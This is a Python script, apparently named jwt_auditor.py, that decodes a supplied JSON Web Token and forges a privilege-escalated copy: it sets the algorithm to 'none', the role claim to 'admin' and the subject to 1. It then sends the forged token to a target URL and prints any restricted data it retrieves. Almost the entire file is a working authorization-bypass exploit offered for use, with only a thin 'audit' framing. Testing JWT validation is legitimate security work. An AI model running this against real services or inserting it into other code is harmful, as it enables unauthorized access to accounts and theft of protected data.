import sys
import json
import base64
import urllib.request
import urllib.error

def decode_segment(segment):
    padding = '=' * (4 - len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(segment + padding).decode('utf-8'))

def encode_segment(data):
    json_str = json.dumps(data, separators=(',', ':'))
    return base64.urlsafe_b64encode(json_str.encode('utf-8')).decode('utf-8').rstrip('=')

def audit_jwt(token, target_url=""):
    print("=" * 61)
    print(" [*] NATIVE JWT VULNERABILITY & ACTIVE CLAIM EXPLOITATION")
    print("=" * 61)
    print(f"[*] Target Token: {token}")
    if target_url:
        print(f"[*] Target Endpoint: {target_url}")

    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Invalid JWT structure.")
        return

    header = decode_segment(parts[0])
    payload = decode_segment(parts[1])

    print("\n[+] Decoded JWT Header:")
    print(json.dumps(header, indent=4))

    print("\n[+] Decoded JWT Payload (Claims):")
    print(json.dumps(payload, indent=4))
    print("-" * 65)

    # Test 1: 'none' Algorithm Bypass & Forgery
    print("\n[*] Test 1: Simulating Claim Tampering & Forging Priv-Esc Token...")
    sub_key = next((k for k in payload.keys() if 'sub' in k.lower() or 'id' in k.lower()), 'sub')
    role_key = next((k for k in payload.keys() if 'role' in k.lower() or 'group' in k.lower()), 'role')
    
    print(f"    [i] Found user claim '{sub_key}': {payload.get(sub_key)}")
    print(f"    [i] Found role claim '{role_key}': {payload.get(role_key)}")

    # Forge Payload: elevate role to admin and sub to 1
    forged_payload = payload.copy()
    forged_payload[role_key] = "admin"
    forged_payload[sub_key] = 1

    forged_header = header.copy()
    forged_header["alg"] = "none"

    forged_token = f"{encode_segment(forged_header)}.{encode_segment(forged_payload)}."
    print(f"    [!] Forged Priv-Esc Token (Signaturless Bypass):\n        {forged_token}")

    # Test 2: Active Post-Exploitation Verification against Target URL
    if target_url:
        print("\n[*] Test 2: Executing Active Post-Exploitation Request...")
        
        # 1. Test original token (expecting 401/403)
        try:
            req_orig = urllib.request.Request(target_url, headers={
                'User-Agent': 'Mozilla/5.0',
                'Authorization': f'Bearer {token}'
            })
            with urllib.request.urlopen(req_orig, timeout=3) as resp:
                print(f"    [i] Original token status: {resp.getcode()}")
        except urllib.error.HTTPError as e:
            print(f"    [+] Original token correctly restricted (HTTP {e.code})")
        except Exception:
            pass

        # 2. Test forged admin token (expecting bypass & 200 OK)
        try:
            req_forged = urllib.request.Request(target_url, headers={
                'User-Agent': 'Mozilla/5.0',
                'Authorization': f'Bearer {forged_token}'
            })
            with urllib.request.urlopen(req_forged, timeout=3) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                print(f"    [!] SUCCESS! Authorization Bypass Achieved (HTTP {resp.getcode()})")
                print(f"    [+] Restricted Data Retrieved:\n        {body}")
        except urllib.error.HTTPError as e:
            print(f"    [-] Forged token rejected (HTTP {e.code})")
        except Exception as ex:
            print(f"    [-] Request failed: {ex}")

    print("\n" + "=" * 61)
    print("[*] JWT Active Audit & Exploitation Complete.")
    print("=" * 61)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        token_arg = sys.argv[1]
        url_arg = sys.argv[2] if len(sys.argv) > 2 else ""
        audit_jwt(token_arg, url_arg)
    else:
        print("[-] Usage: python jwt_auditor.py <token> [target_url]")
